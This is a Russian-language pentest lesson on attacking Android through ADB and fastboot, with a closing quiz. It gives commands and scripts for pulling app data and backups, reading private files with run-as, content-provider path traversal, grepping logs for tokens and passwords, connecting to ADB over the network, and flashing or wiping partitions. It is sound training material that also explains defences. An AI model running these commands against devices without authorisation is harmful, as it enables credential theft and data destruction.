---
id: mobile-adb-fastboot
title: "ADB и fastboot: атаки, эскалация и утечки"
category: mobile
parent: mobile-android-root
difficulty: medium
order: 1
tags: [adb, fastboot, android, debugging, backup, shell, escalation, usb]
prerequisites: [mobile-platforms]
useful_for:
  - "Пентест мобильных приложений"
  - "Bug bounty (debug-сборки)"
  - "Форензика (извлечение данных)"
estimated_minutes: 50
summary: "ADB как атакующий интерфейс: включённая отладка, `adb shell`, backup, content-провайдеры, fastboot и извлечение данных; как это используется в пентесте и что искать."
---
## Введение

Android Debug Bridge (ADB) — штатный инструмент разработчика, который в руках пентестера превращается в мощный вектор: он даёт shell на устройстве, доступ к логам, установку/удаление пакетов, чтение через content-провайдеры и полный backup данных приложения. Отдельно fastboot работает на уровне загрузчика и позволяет прошивать разделы. В этом уроке — практические атаки через ADB/fastboot и то, что защитнику (и тестировщику) важно знать про `debuggable`-сборки.

Важно: `adb` доступен только если включена USB-отладка и устройство авторизовало ключ. Однако в тестовых/инженерных сборках (`ro.debuggable=1`, `ro.secure=0`) ADB может работать с root без подтверждения — это и есть частая находка.

## Базовый набор команд ADB

```bash
adb devices -l
adb shell getprop ro.debuggable       # 1 = debuggable сборка
adb shell getprop ro.secure           # 0 = adbd под root
adb shell id                          # контекст shell/adb
adb shell pm list packages | grep -i target
adb shell pm path com.target.app      # путь к APK
adb shell am start -n com.target.app/.MainActivity
adb shell dumpsys package com.target.app | head -100
adb shell dumpsys activity activities | grep -i target
adb logcat -d | grep -iE 'token|secret|password' | head
```

`adb logcat` — золотая жила: приложения часто логируют токены, URL, ошибки аутентификации. `dumpsys` показывает экспортированные компоненты, intent-filters, разрешения.

## Извлечение APK и данных

```bash
# вытащить APK(ы) приложения
adb shell pm path com.target.app
adb pull /data/app/~~xxxx==/com.target.app-yyy==/base.apk ./base.apk

# бэкап данных (если allowBackup=true)
adb backup -apk -shared -all -f backup.ab com.target.app
# распаковка backup.ab (см. mobile-backup)
java -jar abe.jar unpack backup.ab backup.tar

# content-провайдеры
adb shell content query --uri content://com.target.app.provider/users
adb shell content read --uri content://com.target.app.provider/files/../../databases/app.db
```

Последняя команда — пример path traversal через content-провайдер (подробнее — `mobile-exported-provider`).

## Полный сквозной пример: debuggable-сборка

Дано: тестовое приложение с `android:debuggable="true"`.

```bash
adb shell getprop ro.debuggable          # 1
# запускаем приложение под отладчиком без root
adb shell am set-debug-app -w com.target.app
adb shell am start -n com.target.app/.MainActivity
# читаем приватные файлы от имени run-as (debuggable!)
adb shell run-as com.target.app ls -la /data/data/com.target.app/
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml
```

`run-as` работает для debuggable-приложений и даёт доступ к их песочнице **без root** — это критичная находка в отчёте. На проде `debuggable` должен быть `false`.

## Fastboot как вектор

```bash
adb reboot bootloader
fastboot devices
fastboot getvar all 2>&1 | grep -E 'unlocked|secure|verity'
fastboot oem device-info
fastboot flash boot magisk_patched.img
fastboot erase userdata      # уничтожение данных (осторожно!)
```

Fastboot опасен тем, что на разблокированном загрузчике позволяет прошить произвольный boot/recovery и получить root либо извлечь разделы. На заблокированном устройстве большинство команд вернут `not allowed`.

## ADB over network и беспроводная отладка

```bash
adb tcpip 5555
adb connect 192.168.1.50:5555
adb -s 192.168.1.50:5555 shell id
```

Если устройство в сети и отладка по TCP включена, атакующий в той же сети может подключиться. Android 11+ wireless debugging использует pairing-код — без него подключиться нельзя, но в старых/кастомных сборках порт 5555 часто открыт.

## Частые ошибки

- **`adb devices` пусто**: не включена отладка, не авторизован ключ или сломан udev на Linux.
- **`run-as` не работает**: приложение не debuggable или подписано release-ключом.
- **backup пустой**: `allowBackup=false` или Android 12+ ограничил backup (нужен `-nocompress` и явный пакет).
- **fastboot `not allowed`**: загрузчик заблокирован.
- **`adb root` не даёт root**: на user-сборках `adbd` не может стать root (`ro.debuggable=0`).
- **Забыли `adb kill-server`**: конфликт версий adb-сервера.

## Что дальше / решение

Если нашли `debuggable=true` — это находка уровня High/Medium (доступ к данным без root). Дальше: `mobile-backup` (извлечение), `mobile-exported-provider` (content-провайдеры), `mobile-forensics-android` (полное извлечение для анализа). Для проверки защиты: убедитесь, что в релизе `debuggable=false`, `allowBackup=false`, а ADB не открыт по сети.

## Справочная таблица

| Задача | Команда |
|--------|---------|
| Проверить debuggable | `getprop ro.debuggable` |
| Путь к APK | `pm path <pkg>` |
| Запуск activity | `am start -n <pkg>/<cls>` |
| Приватные файлы (debug) | `run-as <pkg> ls /data/data/<pkg>` |
| Логи | `adb logcat -d` |
| Бэкап | `adb backup -f b.ab <pkg>` |
| Content-запрос | `content query --uri <uri>` |
| Bootloader инфо | `fastboot getvar all` |
| Сеть | `adb tcpip 5555; adb connect ip:5555` |

## Беспроводная отладка и pairing (Android 11+)

С Android 11 беспроводная отладка требует pairing-код — это защита от подключения по TCP без физического доступа. Процесс:

```bash
# на устройстве: Developer options -> Wireless debugging -> Pair device with pairing code
# покажет IP:port и 6-значный код
adb pair 192.168.1.50:37000          # вводим код
adb connect 192.168.1.50:5555
adb -s 192.168.1.50:5555 shell id
```

На Android 10 и ниже достаточно `adb tcpip 5555`, и порт остаётся открытым без pairing — классическая находка при аудите: устройство в корпоративной сети принимает ADB-подключения. Проверка снаружи: `nmap -p 5555 <ip>`. В отчёте — рекомендация отключить wireless debugging и не оставлять `adb tcpip` включённым.

## Эскалация через dumpsys и content

`dumpsys` — недооценённый источник данных. Полезные подкоманды:

```bash
adb shell dumpsys activity top          # активная activity и её extras
adb shell dumpsys activity services     # запущенные сервисы
adb shell dumpsys window windows | grep -i mCurrentFocus
adb shell dumpsys package com.target.app | grep -A2 -i 'exported\|permission'
adb shell dumpsys meminfo com.target.app
adb shell dumpsys notification --noredact   # иногда содержит текст уведомлений
```

`dumpsys notification --noredact` особенно интересен: на части версий Android он раскрывает содержимое уведомлений (токены в push, коды подтверждения). `content` позволяет читать провайдеры:

```bash
adb shell content query --uri content://com.target.app.provider/users
adb shell content call --uri content://com.target.app.provider --method getConfig
```

Если провайдер экспортирован и не защищён разрешением, данные утекают без root.

## Сборка простого ADB-клиента (Python)

Для автоматизации удобно управлять ADB из Python через `adbutils` или `subprocess`:

```python
from adbutils import adb
d = adb.device()
print(d.getprop("ro.build.version.release"))
# вытащить приватные prefs, если debuggable
print(d.shell("run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"))
```

Или чистый subprocess:

```python
import subprocess
def sh(cmd): return subprocess.run(["adb","shell",cmd],capture_output=True,text=True).stdout
for pkg in sh("pm list packages").splitlines():
    if "target" in pkg:
        print(pkg, sh(f"pm path {pkg.split(':')[1]}").strip())
```

Так строятся скрипты массовой разведки: перебор пакетов, сбор путей к APK, проверка `debuggable`.

## Автоматизация сбора артефактов

Конвейер для быстрой разведки тестового устройства:

```bash
#!/usr/bin/env bash
OUT=./recon_$(date +%s); mkdir -p "$OUT"
adb shell pm list packages > "$OUT/packages.txt"
adb shell getprop > "$OUT/getprop.txt"
adb shell dumpsys > "$OUT/dumpsys.txt"
adb logcat -d > "$OUT/logcat.txt"
# APK-пути
while read -r p; do
  b=${p#package:}
  adb shell pm path "$b" >> "$OUT/apk_paths.txt"
done < "$OUT/packages.txt"
# ищем секреты в логах
grep -iE 'token|secret|password|api[_-]?key' "$OUT/logcat.txt" | head
```

## Что считать находкой

| Наблюдение | Severity | Почему |
|------------|----------|--------|
| `ro.debuggable=1` | High | доступ к данным без root |
| `allowBackup=true` + секреты | High | извлечение данных |
| ADB по TCP открыт | Medium | доступ из сети |
| Экспортированный provider | High | утечка данных |
| Секреты в logcat | Medium | утечка через логи |
| `run-as` работает | High | песочница доступна |

Эти пункты — типовые находки аудита конфигурации Android-приложения и часто дают быстрые очки в bug bounty.

## Практикум: полный сбор артефактов скриптом

Разберём сбор артефактов тестового устройства в один скрипт, чтобы не повторять вручную.

```bash
#!/usr/bin/env bash
set -e
OUT="recon_$(date +%s)"; mkdir -p "$OUT"
# идентификация
adb shell getprop > "$OUT/getprop.txt"
adb shell pm list packages | sed 's/package://' > "$OUT/packages.txt"
# пути APK
: > "$OUT/apk_paths.txt"
while read -r p; do adb shell pm path "$p" >> "$OUT/apk_paths.txt"; done < "$OUT/packages.txt"
# состояние и логи
adb shell dumpsys > "$OUT/dumpsys.txt"
adb logcat -d > "$OUT/logcat.txt"
# поиск секретов в логах
grep -iE 'token|secret|password|api[_-]?key' "$OUT/logcat.txt" | head -50
echo "saved to $OUT"
```

Для каждого приложения дополнительно:

```bash
pkg=com.target.app
adb shell dumpsys package "$pkg" | grep -iE 'exported|permission' > "$OUT/$pkg.txt"
adb shell pm path "$pkg"
```

## Анализ результатов

Проверяйте: `ro.debuggable=1`, `allowBackup`, экспортированные компоненты, секреты в logcat, открытый ADB по TCP. Каждое — потенциальная находка. Фиксируйте точные команды для воспроизведения.

## Итог

Автоматизация сбора экономит часы и снижает риск пропустить артефакт. Комбинируйте с анализом APK (`mobile-static-analysis`) и динамикой (`mobile-dynamic-frida`).

## Квиз

```quiz
- question: "Какое свойство указывает, что сборка debuggable?"
  options:
    - "ro.secure"
    - "ro.debuggable=1"
    - "ro.build.tags"
    - "ro.boot.verifiedbootstate"
  answer: 1
- question: "Что делает `run-as <pkg>`?"
  options:
    - "Даёт доступ к песочнице debuggable-приложения без root"
    - "Прошивает boot"
    - "Сканирует порты"
    - "Расшифровывает трафик"
  answer: 0
- question: "Что нужно, чтобы `adb backup` извлёк данные приложения?"
  options:
    - "allowBackup=true (и не заблокировано версией Android)"
    - "Только root"
    - "Разблокированный загрузчик"
    - "Wireless debugging"
  answer: 0
- question: "Почему ADB по TCP опасен?"
  options:
    - "Он шифрует трафик"
    - "Устройство в сети может принимать подключения отладки без физического доступа"
    - "Он ускоряет устройство"
    - "Он стирает данные"
  answer: 1
- question: "Какая команда показывает экспортированные компоненты и разрешения?"
  options:
    - "adb logcat"
    - "adb shell dumpsys package <pkg>"
    - "fastboot getvar all"
    - "adb backup"
  answer: 1
```

## Где пригодится

- **Пентест:** эксплуатация debuggable-сборок, извлечение данных, разведка компонентов.
- **Bug bounty:** находки по `debuggable`, `allowBackup`, экспортированным провайдерам.
- **Форензика:** легальное извлечение данных при наличии доступа.
- **CTF:** Mobile-задачи с ADB-доступом к приложению.
